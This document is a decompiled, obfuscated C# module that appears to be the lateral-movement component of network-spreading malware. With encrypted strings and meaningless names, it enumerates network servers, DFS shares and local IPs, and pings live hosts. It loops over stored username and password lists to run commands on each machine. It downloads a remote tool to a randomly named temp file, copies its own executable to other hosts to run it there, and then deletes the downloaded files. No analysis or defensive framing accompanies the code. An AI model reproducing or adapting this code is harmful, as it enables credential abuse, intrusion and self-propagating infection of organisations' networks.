using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gTywbHaKSaZFRYP;

internal sealed class pPSzUAdsao
{
	public sealed class UjZEjOaBJXDdmjaa
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum qekwPSmDBEdO
	{
		ydHwOBAmGqZMBE = 1,
		LPPjkJrjXV,
		hInDETqkCyuT,
		JPrYAdQRlCY,
		NMJKmkPqnId
	}

	public enum lmqBzoePqeXoa
	{
		xEFPuJwBgAY,
		ZlbNctOganCkca,
		EUfrlSMLmQGV,
		IpXejQlTORwnwdzw
	}

	public enum OvHlAgWLbJNN
	{
		dPwjRWmLGOcSA = 1,
		PsKMHjxrsoGFE = 2,
		rXpbhwdwqmtmTH = 4,
		YywJDVIudejo = 8,
		NHTCjSdYijkRh = 16,
		FMnloWmArgPE = 19
	}

	public enum UYCvXkeBmjxD
	{
		KFotqFLLppiEiN,
		BCxRWTCLNiyqR,
		BznZKWUgcokS,
		JdhdYQlzcrDoLG,
		PzlmYjcOmmpOSh,
		TFBlBbcniQtW,
		CUmlsKbyUt,
		GpRHkodocp,
		aUAxnbPOKYpJr,
		VaCuhPjAzfChWQjB,
		mUDgEXepqBOc,
		RbgTxCYpNovgo
	}

	public sealed class AzQGklUIXnoasLW : IEnumerable
	{
		private enum KmXcmFaVaLZQhW
		{
			pekGoKAbottJrXd = 0,
			LmtAhDrxnHG = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class BOraTJdNPgUBV
		{
			public qekwPSmDBEdO HgetkntbJoZjpr;

			public lmqBzoePqeXoa vkOyCosKOb;

			public UYCvXkeBmjxD NUfreQOFiEEJTB;

			public OvHlAgWLbJNN WYxPRdhgEQ;

			public string QCvzOmkqfv;

			public string ThfWwbSnFxrJbl;

			public string hrwXjegmamsj;

			public string lpZOUJztrGnfA;
		}

		private ArrayList qJeOatwIbxJJu = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern KmXcmFaVaLZQhW WNetOpenEnumA(qekwPSmDBEdO dwScope, lmqBzoePqeXoa dwType, OvHlAgWLbJNN dwUsage, BOraTJdNPgUBV p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern KmXcmFaVaLZQhW WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern KmXcmFaVaLZQhW WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(BOraTJdNPgUBV boraTJdNPgUBV_0, qekwPSmDBEdO qekwPSmDBEdO_0, lmqBzoePqeXoa lmqBzoePqeXoa_0, OvHlAgWLbJNN ovHlAgWLbJNN_0, UYCvXkeBmjxD uycvXkeBmjxD_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(qekwPSmDBEdO_0, lmqBzoePqeXoa_0, ovHlAgWLbJNN_0, boraTJdNPgUBV_0, out lphEnum) == KmXcmFaVaLZQhW.pekGoKAbottJrXd)
			{
				KmXcmFaVaLZQhW kmXcmFaVaLZQhW;
				do
				{
					kmXcmFaVaLZQhW = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (kmXcmFaVaLZQhW)
					{
					case KmXcmFaVaLZQhW.LmtAhDrxnHG:
						continue;
					case KmXcmFaVaLZQhW.pekGoKAbottJrXd:
						Marshal.PtrToStructure(intPtr, boraTJdNPgUBV_0);
						if (boraTJdNPgUBV_0.NUfreQOFiEEJTB == uycvXkeBmjxD_0)
						{
							qJeOatwIbxJJu.Add(boraTJdNPgUBV_0.ThfWwbSnFxrJbl);
						}
						if ((boraTJdNPgUBV_0.WYxPRdhgEQ & OvHlAgWLbJNN.PsKMHjxrsoGFE) == OvHlAgWLbJNN.PsKMHjxrsoGFE)
						{
							EnumerateServers(boraTJdNPgUBV_0, qekwPSmDBEdO_0, lmqBzoePqeXoa_0, ovHlAgWLbJNN_0, uycvXkeBmjxD_0);
						}
						continue;
					}
					break;
				}
				while (kmXcmFaVaLZQhW != KmXcmFaVaLZQhW.LmtAhDrxnHG);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public AzQGklUIXnoasLW(qekwPSmDBEdO qekwPSmDBEdO_0, lmqBzoePqeXoa lmqBzoePqeXoa_0, OvHlAgWLbJNN ovHlAgWLbJNN_0, UYCvXkeBmjxD uycvXkeBmjxD_0)
		{
			BOraTJdNPgUBV boraTJdNPgUBV_ = new BOraTJdNPgUBV();
			EnumerateServers(boraTJdNPgUBV_, qekwPSmDBEdO_0, lmqBzoePqeXoa_0, ovHlAgWLbJNN_0, uycvXkeBmjxD_0);
		}

		public IEnumerator GetEnumerator()
		{
			return qJeOatwIbxJJu.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct eCWlcHrDBqfhH
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string ZmNfdtXTXPVN;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string WgvKVWBlqLMNo;

		public uint wcFDjuKHTQKSW;

		public uint rSzssjHxue;

		public IntPtr pxOHAViGRFvv;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct cpMVlIabhZRr
	{
		public int wcFDjuKHTQKSW;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string AbTmnDTUyetQvi;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string hmQAvbTJgwarX;
	}

	public struct VjnjvfygTVDFN
	{
		public string sKXPfpDrcCqR;

		public string[] ypWdBWrgmH;

		public VjnjvfygTVDFN(string string_0, string[] string_1)
		{
			sKXPfpDrcCqR = string_0;
			ypWdBWrgmH = string_1;
		}
	}

	private sealed class CgalfYlwVktrQ
	{
		public string hiINwgbqaoGvt;

		public string IQFOBjhYNXGx;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107393163)) && !string_0.StartsWith(getString_0(107393190)) && !string_0.StartsWith(getString_0(107393181)) && !string_0.Contains(getString_0(107394019))) || !ekTxsoWmOuCtv(string_0))
			{
				return;
			}
			try
			{
				if (PYtJscelCaHU.HPbZVzfaaiUf == getString_0(107396884))
				{
					for (int i = 0; i < CPBqDAxLxUb.Count; i++)
					{
						PYtJscelCaHU.tNIQYAGwSjGxNLsorK(getString_0(107393136), getString_0(107393155) + string_0 + getString_0(107393146) + CPBqDAxLxUb[i] + getString_0(107393101) + SYBPLbuvdPFNErv[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					PYtJscelCaHU.tNIQYAGwSjGxNLsorK(getString_0(107393136), getString_0(107393155) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (PYtJscelCaHU.HPbZVzfaaiUf == getString_0(107396884))
			{
				for (int j = 0; j < CPBqDAxLxUb.Count; j++)
				{
					if (PYtJscelCaHU.brAfHWSzDbgM)
					{
						if (File.Exists(hiINwgbqaoGvt))
						{
							PYtJscelCaHU.tNIQYAGwSjGxNLsorK(hiINwgbqaoGvt, getString_0(107391651) + string_0 + getString_0(107404796) + CPBqDAxLxUb[j] + getString_0(107404755) + SYBPLbuvdPFNErv[j] + getString_0(107404746) + Assembly.GetEntryAssembly()!.Location + getString_0(107391605));
						}
					}
					else if (File.Exists(IQFOBjhYNXGx))
					{
						PYtJscelCaHU.tNIQYAGwSjGxNLsorK(IQFOBjhYNXGx, getString_0(107391651) + string_0 + getString_0(107404796) + CPBqDAxLxUb[j] + getString_0(107404755) + SYBPLbuvdPFNErv[j] + getString_0(107404233) + Assembly.GetEntryAssembly()!.Location + getString_0(107391605));
					}
				}
			}
			else if (PYtJscelCaHU.brAfHWSzDbgM)
			{
				if (File.Exists(hiINwgbqaoGvt))
				{
					PYtJscelCaHU.tNIQYAGwSjGxNLsorK(hiINwgbqaoGvt, getString_0(107391651) + string_0 + getString_0(107404144) + Assembly.GetEntryAssembly()!.Location + getString_0(107391605));
				}
			}
			else if (File.Exists(IQFOBjhYNXGx))
			{
				PYtJscelCaHU.tNIQYAGwSjGxNLsorK(IQFOBjhYNXGx, getString_0(107391651) + string_0 + getString_0(107404111) + Assembly.GetEntryAssembly()!.Location + getString_0(107391605));
			}
		}

		static CgalfYlwVktrQ()
		{
			Strings.CreateGetStringDelegate(typeof(CgalfYlwVktrQ));
		}
	}

	private sealed class XKEYsvrDQQNqYHhj
	{
		public string IuHRFtzUNbKP;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != IuHRFtzUNbKP;
		}
	}

	public static List<string> qwElBetPceBc;

	public static string BXShfDhklbkN;

	public static List<string> CPBqDAxLxUb;

	public static List<string> SYBPLbuvdPFNErv;

	public static List<string> kbGFKVTcuWpRtO;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<UjZEjOaBJXDdmjaa> bFYIIPvZwLwWFVX()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107397256);
			process.StartInfo.Arguments = getString_0(107405257);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<UjZEjOaBJXDdmjaa> list = new List<UjZEjOaBJXDdmjaa>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107405208))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new UjZEjOaBJXDdmjaa
						{
							ServerName = getString_0(107397261) + stringBuilder.ToString() + getString_0(107404683)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string JCJrlIIXLOFFUZbjHj, int eztenfhwdks, int SnbrRrcmErEc, out IntPtr hRMSMMsXOzJLEW, [MarshalAs(UnmanagedType.I4)] out int zrPVBVHIeuDC, [MarshalAs(UnmanagedType.I4)] ref int aVajtWkcCuL);

	public static List<VjnjvfygTVDFN> aQxoaknPlHJ(string string_0)
	{
		try
		{
			List<VjnjvfygTVDFN> list = new List<VjnjvfygTVDFN>();
			IntPtr hRMSMMsXOzJLEW = default(IntPtr);
			int zrPVBVHIeuDC = 0;
			int aVajtWkcCuL = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out hRMSMMsXOzJLEW, out zrPVBVHIeuDC, ref aVajtWkcCuL) == 0)
			{
				for (int i = 0; i < zrPVBVHIeuDC; i++)
				{
					eCWlcHrDBqfhH eCWlcHrDBqfhH = (eCWlcHrDBqfhH)Marshal.PtrToStructure(hRMSMMsXOzJLEW + i * Marshal.SizeOf(typeof(eCWlcHrDBqfhH)), typeof(eCWlcHrDBqfhH));
					if (eCWlcHrDBqfhH.ZmNfdtXTXPVN == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < eCWlcHrDBqfhH.rSzssjHxue; j++)
					{
						IntPtr ptr = new IntPtr(eCWlcHrDBqfhH.pxOHAViGRFvv.ToInt64() + j * Marshal.SizeOf(typeof(cpMVlIabhZRr)));
						cpMVlIabhZRr cpMVlIabhZRr = (cpMVlIabhZRr)Marshal.PtrToStructure(ptr, typeof(cpMVlIabhZRr));
						if (cpMVlIabhZRr.wcFDjuKHTQKSW == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107391594),
								cpMVlIabhZRr.AbTmnDTUyetQvi,
								cpMVlIabhZRr.hmQAvbTJgwarX
							}));
						}
					}
					string text = eCWlcHrDBqfhH.ZmNfdtXTXPVN.Replace(string_0, getString_0(107393962));
					if (text.StartsWith(getString_0(107397261)))
					{
						text = text.Substring(1);
					}
					list.Add(new VjnjvfygTVDFN(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void FrkPIGkvhgeP()
	{
		PYtJscelCaHU.wdbDsjzTMTZdknmj(getString_0(107404674));
		List<UjZEjOaBJXDdmjaa> list = bFYIIPvZwLwWFVX();
		List<VjnjvfygTVDFN> list2 = aQxoaknPlHJ(Environment.MachineName);
		if (list2 != null)
		{
			foreach (VjnjvfygTVDFN item in list2)
			{
				string[] ypWdBWrgmH = item.ypWdBWrgmH;
				foreach (string text in ypWdBWrgmH)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (PYtJscelCaHU.HPbZVzfaaiUf == getString_0(107396827))
						{
							for (int j = 0; j < CPBqDAxLxUb.Count; j++)
							{
								PYtJscelCaHU.tNIQYAGwSjGxNLsorK(getString_0(107393079), getString_0(107392958) + text + getString_0(107393089) + CPBqDAxLxUb[j] + getString_0(107393044) + SYBPLbuvdPFNErv[j]);
							}
						}
						else
						{
							PYtJscelCaHU.tNIQYAGwSjGxNLsorK(getString_0(107393079), getString_0(107392958) + text);
						}
						PYtJscelCaHU.NHjEeCAIyKCHA.Add(text.Replace(getString_0(107391543), getString_0(107393962)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (UjZEjOaBJXDdmjaa item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (PYtJscelCaHU.HPbZVzfaaiUf == getString_0(107396827))
				{
					for (int k = 0; k < CPBqDAxLxUb.Count; k++)
					{
						PYtJscelCaHU.tNIQYAGwSjGxNLsorK(getString_0(107393079), getString_0(107392958) + item2.ServerName + getString_0(107393089) + CPBqDAxLxUb[k] + getString_0(107393044) + SYBPLbuvdPFNErv[k]);
					}
				}
				else
				{
					PYtJscelCaHU.tNIQYAGwSjGxNLsorK(getString_0(107393079), getString_0(107392958) + item2.ServerName);
				}
				PYtJscelCaHU.NHjEeCAIyKCHA.Add(item2.ServerName.Replace(getString_0(107391543), getString_0(107393962)));
			}
			catch
			{
			}
		}
	}

	public static void mtbMcnjbjgRz()
	{
		CgalfYlwVktrQ CS_0024_003C_003E8__locals0 = new CgalfYlwVktrQ();
		List<IoXvsfKKDqKP> list = IoXvsfKKDqKP.ZQqtZwETJef();
		foreach (IoXvsfKKDqKP item in list)
		{
			qwElBetPceBc.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.hiINwgbqaoGvt = getString_0(107393962);
		CS_0024_003C_003E8__locals0.IQFOBjhYNXGx = getString_0(107393962);
		try
		{
			CS_0024_003C_003E8__locals0.hiINwgbqaoGvt = OcxecJYMJPqvRV();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.IQFOBjhYNXGx = nUztbZMipq();
		}
		catch
		{
		}
		foreach (IoXvsfKKDqKP item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107393106)) || item2.IPAddress.StartsWith(getString_0(107393133)) || item2.IPAddress.StartsWith(getString_0(107393124)) || item2.IPAddress.Contains(getString_0(107393962)))
				{
					oTEilPTLcsievpAm.BEhZcKEcEvFOY(item2.MacAddress, item2.IPAddress, getString_0(107404589));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(qwElBetPceBc, delegate(string string_0)
			{
				if ((string_0.StartsWith(CgalfYlwVktrQ.getString_0(107393163)) || string_0.StartsWith(CgalfYlwVktrQ.getString_0(107393190)) || string_0.StartsWith(CgalfYlwVktrQ.getString_0(107393181)) || string_0.Contains(CgalfYlwVktrQ.getString_0(107394019))) && ekTxsoWmOuCtv(string_0))
				{
					try
					{
						if (PYtJscelCaHU.HPbZVzfaaiUf == CgalfYlwVktrQ.getString_0(107396884))
						{
							for (int i = 0; i < CPBqDAxLxUb.Count; i++)
							{
								PYtJscelCaHU.tNIQYAGwSjGxNLsorK(CgalfYlwVktrQ.getString_0(107393136), CgalfYlwVktrQ.getString_0(107393155) + string_0 + CgalfYlwVktrQ.getString_0(107393146) + CPBqDAxLxUb[i] + CgalfYlwVktrQ.getString_0(107393101) + SYBPLbuvdPFNErv[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							PYtJscelCaHU.tNIQYAGwSjGxNLsorK(CgalfYlwVktrQ.getString_0(107393136), CgalfYlwVktrQ.getString_0(107393155) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (PYtJscelCaHU.HPbZVzfaaiUf == CgalfYlwVktrQ.getString_0(107396884))
					{
						for (int j = 0; j < CPBqDAxLxUb.Count; j++)
						{
							if (PYtJscelCaHU.brAfHWSzDbgM)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.hiINwgbqaoGvt))
								{
									PYtJscelCaHU.tNIQYAGwSjGxNLsorK(CS_0024_003C_003E8__locals0.hiINwgbqaoGvt, CgalfYlwVktrQ.getString_0(107391651) + string_0 + CgalfYlwVktrQ.getString_0(107404796) + CPBqDAxLxUb[j] + CgalfYlwVktrQ.getString_0(107404755) + SYBPLbuvdPFNErv[j] + CgalfYlwVktrQ.getString_0(107404746) + Assembly.GetEntryAssembly()!.Location + CgalfYlwVktrQ.getString_0(107391605));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.IQFOBjhYNXGx))
							{
								PYtJscelCaHU.tNIQYAGwSjGxNLsorK(CS_0024_003C_003E8__locals0.IQFOBjhYNXGx, CgalfYlwVktrQ.getString_0(107391651) + string_0 + CgalfYlwVktrQ.getString_0(107404796) + CPBqDAxLxUb[j] + CgalfYlwVktrQ.getString_0(107404755) + SYBPLbuvdPFNErv[j] + CgalfYlwVktrQ.getString_0(107404233) + Assembly.GetEntryAssembly()!.Location + CgalfYlwVktrQ.getString_0(107391605));
							}
						}
					}
					else if (PYtJscelCaHU.brAfHWSzDbgM)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.hiINwgbqaoGvt))
						{
							PYtJscelCaHU.tNIQYAGwSjGxNLsorK(CS_0024_003C_003E8__locals0.hiINwgbqaoGvt, CgalfYlwVktrQ.getString_0(107391651) + string_0 + CgalfYlwVktrQ.getString_0(107404144) + Assembly.GetEntryAssembly()!.Location + CgalfYlwVktrQ.getString_0(107391605));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.IQFOBjhYNXGx))
					{
						PYtJscelCaHU.tNIQYAGwSjGxNLsorK(CS_0024_003C_003E8__locals0.IQFOBjhYNXGx, CgalfYlwVktrQ.getString_0(107391651) + string_0 + CgalfYlwVktrQ.getString_0(107404111) + Assembly.GetEntryAssembly()!.Location + CgalfYlwVktrQ.getString_0(107391605));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.hiINwgbqaoGvt))
			{
				File.Delete(CS_0024_003C_003E8__locals0.hiINwgbqaoGvt);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.IQFOBjhYNXGx))
			{
				File.Delete(CS_0024_003C_003E8__locals0.IQFOBjhYNXGx);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string OcxecJYMJPqvRV()
	{
		if (IntPtr.Size == 8)
		{
			return oFaBaBQCbpu(new Uri(PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107404536))));
		}
		return oFaBaBQCbpu(new Uri(PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107404536))));
	}

	public static string nUztbZMipq()
	{
		if (IntPtr.Size == 8)
		{
			return oFaBaBQCbpu(new Uri(PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107404487))));
		}
		return oFaBaBQCbpu(new Uri(PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107404890))));
	}

	public static bool ekTxsoWmOuCtv(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string oFaBaBQCbpu(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107404817), getString_0(107393962)).Remove(0, 3) + getString_0(107404844);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> qMRvenqpIqrzZzRz()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107404835));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107404770)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107404725));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				XKEYsvrDQQNqYHhj CS_0024_003C_003E8__locals0 = new XKEYsvrDQQNqYHhj();
				CS_0024_003C_003E8__locals0.IuHRFtzUNbKP = array4[j];
				if (CS_0024_003C_003E8__locals0.IuHRFtzUNbKP.Contains(getString_0(107404744)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.IuHRFtzUNbKP).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static pPSzUAdsao()
	{
		Strings.CreateGetStringDelegate(typeof(pPSzUAdsao));
		qwElBetPceBc = new List<string>();
		BXShfDhklbkN = getString_0(107393962);
		CPBqDAxLxUb = new List<string>();
		SYBPLbuvdPFNErv = new List<string>();
		kbGFKVTcuWpRtO = new List<string>();
	}
}
